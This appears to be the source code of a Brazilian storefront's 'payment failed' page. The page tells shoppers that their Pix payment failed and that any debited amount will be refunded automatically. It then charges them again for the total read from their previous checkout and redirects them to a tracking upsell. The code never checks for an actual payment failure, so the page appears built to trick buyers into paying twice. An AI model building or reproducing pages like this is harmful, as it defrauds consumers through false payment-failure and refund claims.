import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import QRCode from "qrcode";
import { toast } from "sonner";
import { AlertTriangle, Check, CheckCircle2, Copy, Loader2, Lock } from "lucide-react";
import { createPix, checkPixStatus } from "@/lib/pix.functions";

// --- config (override via .env: VITE_ERRO_AMOUNT_CENTS, VITE_ERRO_SUPPORT, VITE_ERRO_ACCESS_URL) ---
const DEFAULT_AMOUNT_CENTS = Number(import.meta.env["VITE_ERRO_AMOUNT_CENTS"] ?? 9700);
const SUPPORT = String(import.meta.env["VITE_ERRO_SUPPORT"] ?? "suporte@tikbrshop.store");
const ACCESS_URL = String(import.meta.env["VITE_ERRO_ACCESS_URL"] ?? "/");
const EXPIRES_SECONDS = 15 * 60;

const fmt = (cents: number) => `R$ ${(cents / 100).toFixed(2).replace(".", ",")}`;

export const Route = createFileRoute("/erro")({
  head: () => ({
    meta: [
      { title: "Falha no pagamento | Gere um novo Pix" },
      {
        name: "description",
        content: "Identificamos uma falha no seu pagamento. Confirme seus dados e gere um novo Pix em segundos.",
      },
      { property: "og:title", content: "Falha no pagamento | Gere um novo Pix" },
      {
        property: "og:description",
        content: "Identificamos uma falha no seu pagamento. Confirme seus dados e gere um novo Pix em segundos.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: ErroPage,
});

function ErroPage() {
  const navigate = useNavigate();
  const createPixFn = useServerFn(createPix);
  const checkStatusFn = useServerFn(checkPixStatus);

  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [errors, setErrors] = useState<{ name?: string; email?: string; form?: string }>({});
  const [loading, setLoading] = useState(false);

  const [qrCode, setQrCode] = useState<string | null>(null);
  const [externalId, setExternalId] = useState<string | null>(null);
  const [img, setImg] = useState<string | null>(null);
  const [left, setLeft] = useState(EXPIRES_SECONDS);
  const [expired, setExpired] = useState(false);
  const poll = useRef<ReturnType<typeof setInterval> | null>(null);

  // Valor pago no checkout (fallback: subtotal do carrinho, depois default)
  const [amountCents, setAmountCents] = useState(DEFAULT_AMOUNT_CENTS);
  useEffect(() => {
    try {
      const saved = Number(localStorage.getItem("checkout_total"));
      if (saved > 0) return setAmountCents(saved);
      const raw = localStorage.getItem("cart");
      const cart = raw ? JSON.parse(raw) : [];
      if (Array.isArray(cart) && cart.length > 0) {
        const sub = cart.reduce(
          (s: number, it: { price?: number; qty?: number; addRandom?: boolean }) =>
            s + (Number(it.price) || 0) * (Number(it.qty) || 1) + (it.addRandom ? 23.9 : 0),
          0,
        );
        if (sub > 0) setAmountCents(Math.round(sub * 100));
      }
    } catch { /* fallback padrão */ }
  }, []);


  useEffect(() => {
    if (!qrCode) return setImg(null);
    QRCode.toDataURL(qrCode, { width: 512, margin: 1 }).then(setImg).catch(() => setImg(null));
  }, [qrCode]);

  // countdown
  useEffect(() => {
    if (step !== 2 || expired) return;
    const t = setInterval(() => {
      setLeft((s) => {
        if (s <= 1) {
          setExpired(true);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  }, [step, expired]);

  // polling
  useEffect(() => {
    if (step !== 2 || !externalId || expired) return;
    const tick = async () => {
      try {
        const res = await checkStatusFn({ data: { externalId } });
        if (res.status === "paid") {
          if (poll.current) clearInterval(poll.current);
          setStep(3);
        }
      } catch {
        /* keep polling */
      }
    };
    poll.current = setInterval(tick, 5000);
    void tick();
    return () => {
      if (poll.current) clearInterval(poll.current);
    };
  }, [step, externalId, expired, checkStatusFn]);

  // redireciona para o upsell de rastreio após pagamento confirmado
  useEffect(() => {
    let t: ReturnType<typeof setTimeout> | null = null;
    if (step === 3) {
      t = setTimeout(() => navigate({ to: "/rastreio" }), 1500);
    }
    return () => {
      if (t) clearTimeout(t);
    };
  }, [step, navigate]);

  const generate = useCallback(async () => {
    const next: typeof errors = {};
    const n = name.trim();
    if (!/^[A-Za-zÀ-ÿ']{2,}(\s+[A-Za-zÀ-ÿ']{2,})+$/.test(n)) next.name = "Informe seu nome e sobrenome";
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email.trim())) next.email = "Informe um e-mail válido";
    setErrors(next);
    if (Object.keys(next).length > 0) return;

    setLoading(true);
    try {
      const res = await createPixFn({ data: { amountCents } });
      if (!res.ok) {
        setErrors({ form: res.error ?? "Não foi possível gerar o Pix. Tente novamente." });
        return;
      }
      setQrCode(res.qrCode);
      setExternalId(res.externalId);
      setLeft(EXPIRES_SECONDS);
      setExpired(false);
      setStep(2);
    } catch {
      setErrors({ form: "Falha de conexão. Tente novamente em instantes." });
    } finally {
      setLoading(false);
    }
  }, [name, email, createPixFn]);

  const mmss = `${String(Math.floor(left / 60)).padStart(2, "0")}:${String(left % 60).padStart(2, "0")}`;

  return (
    <main className="mx-auto min-h-dvh max-w-[480px] bg-surface px-4 py-8">
      {step === 1 && (
        <section>
          <div className="mx-auto flex size-16 items-center justify-center rounded-full bg-amber-500/15">
            <AlertTriangle className="size-8 text-amber-500" strokeWidth={2.2} />
          </div>
          <h1 className="mt-4 text-center text-[22px] font-bold leading-tight">
            Ops! Identificamos uma falha no seu pagamento
          </h1>
          <p className="mt-2 text-center text-[14px] text-muted-foreground">
            Não se preocupe, isso pode acontecer por instabilidade momentânea no sistema.
          </p>

          <div className="mt-5 space-y-3 rounded-2xl bg-emerald-500/10 p-4">
            {[
              "Se o valor já foi debitado, o estorno é automático e cai em até 7 dias úteis.",
              "Para garantir seu acesso agora, confirme seus dados abaixo e gere um novo PIX.",
            ].map((t) => (
              <p key={t} className="flex gap-2 text-[14px] leading-snug">
                <Check className="mt-0.5 size-4 shrink-0 text-emerald-500" strokeWidth={3} />
                <span>{t}</span>
              </p>
            ))}
          </div>

          <div className="mt-6 space-y-4">
            <div>
              <label htmlFor="nome" className="text-[13px] font-semibold">
                Nome completo
              </label>
              <input
                id="nome"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="Seu nome e sobrenome"
                className="mt-1.5 w-full rounded-xl bg-background px-4 py-3.5 text-[15px] outline-none focus:ring-2 focus:ring-emerald-500/40"
              />
              {errors.name && <p className="mt-1 text-[12px] text-destructive">{errors.name}</p>}
            </div>
            <div>
              <label htmlFor="email" className="text-[13px] font-semibold">
                E-mail
              </label>
              <input
                id="email"
                type="email"
                inputMode="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="voce@email.com"
                className="mt-1.5 w-full rounded-xl bg-background px-4 py-3.5 text-[15px] outline-none focus:ring-2 focus:ring-emerald-500/40"
              />
              {errors.email && <p className="mt-1 text-[12px] text-destructive">{errors.email}</p>}
            </div>
          </div>

          {errors.form && (
            <p className="mt-4 rounded-xl bg-destructive/10 px-4 py-3 text-[13px] text-destructive">{errors.form}</p>
          )}

          <p className="mt-6 rounded-xl bg-background px-4 py-3 text-center text-[15px] font-bold">
            Valor: <span className="text-emerald-600">{fmt(amountCents)}</span>
          </p>

          <button
            onClick={() => void generate()}
            disabled={loading}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-500 py-4 text-[16px] font-bold text-background disabled:opacity-70"
          >
            {loading && <Loader2 className="size-4 animate-spin" />}
            {loading ? "Gerando pagamento..." : "Confirmar pagamento"}
          </button>

          <p className="mt-3 flex items-center justify-center gap-1.5 text-[12px] text-muted-foreground">
            <Lock className="size-3.5" /> Pagamento 100% seguro
          </p>
        </section>
      )}

      {step === 2 && !expired && (
        <section>
          <h1 className="text-center text-[21px] font-bold">Falta pouco! Finalize seu pagamento</h1>

          <div className="mx-auto mt-5 w-[240px] rounded-2xl bg-background p-3">
            {img ? (
              <img src={img} alt="QR Code Pix para pagamento" className="w-full" />
            ) : (
              <div className="flex h-[214px] items-center justify-center text-[13px] text-muted-foreground">
                Gerando QR...
              </div>
            )}
          </div>

          <p className="mt-3 flex items-center justify-center gap-2 text-[13px] text-muted-foreground">
            <Loader2 className="size-4 animate-spin" /> Aguardando pagamento...
          </p>

          <p className="mt-4 break-all rounded-xl bg-background px-3 py-2 text-[11px] text-muted-foreground">
            {qrCode}
          </p>
          <button
            onClick={() => {
              if (qrCode) void navigator.clipboard.writeText(qrCode);
              toast.success("Código Pix copiado");
            }}
            className="mt-3 flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-500 py-3.5 text-[15px] font-bold text-background"
          >
            <Copy className="size-4" /> Copiar código
          </button>

          <ol className="mt-6 space-y-2.5">
            {["Abra o app do seu banco", "Escolha pagar via PIX com QR Code ou código copia e cola", "Confirme o pagamento"].map(
              (t, i) => (
                <li key={t} className="flex gap-3 text-[14px]">
                  <span className="flex size-6 shrink-0 items-center justify-center rounded-full bg-emerald-500/15 text-[12px] font-bold text-emerald-600">
                    {i + 1}
                  </span>
                  {t}
                </li>
              ),
            )}
          </ol>

          <p className="mt-6 text-center text-[14px]">
            Este Pix expira em <span className="font-bold tabular-nums">{mmss}</span>
          </p>
          <p className="mt-2 text-center text-[13px] text-muted-foreground">
            Assim que o pagamento for identificado, você recebe o acesso automaticamente por e-mail.
          </p>
        </section>
      )}

      {step === 2 && expired && (
        <section className="pt-10 text-center">
          <div className="mx-auto flex size-16 items-center justify-center rounded-full bg-amber-500/15">
            <AlertTriangle className="size-8 text-amber-500" />
          </div>
          <h1 className="mt-4 text-[21px] font-bold">Seu Pix expirou</h1>
          <p className="mt-2 text-[14px] text-muted-foreground">
            Nenhum pagamento foi identificado. Gere um novo código para continuar.
          </p>
          <button
            onClick={() => void generate()}
            disabled={loading}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-500 py-4 text-[16px] font-bold text-background disabled:opacity-70"
          >
            {loading && <Loader2 className="size-4 animate-spin" />}
            {loading ? "Gerando pagamento..." : "Gerar novo PIX"}
          </button>
        </section>
      )}

      {step === 3 && (
        <section className="pt-12 text-center">
          <CheckCircle2
            className="mx-auto size-20 animate-in fade-in zoom-in text-emerald-500 duration-500"
            strokeWidth={1.8}
          />
          <h1 className="mt-5 text-[24px] font-bold">Pagamento confirmado!</h1>
          <p className="mt-2 text-[14px] text-muted-foreground">
            Seu acesso foi liberado e enviado para o e-mail <span className="font-semibold text-foreground">{email}</span>
          </p>
          <a
            href={ACCESS_URL}
            className="mt-7 block w-full rounded-xl bg-emerald-500 py-4 text-[16px] font-bold text-background"
          >
            Acessar agora
          </a>
          <p className="mt-4 text-[12px] text-muted-foreground">Qualquer dúvida, fale com nosso suporte: {SUPPORT}</p>
        </section>
      )}
    </main>
  );
}
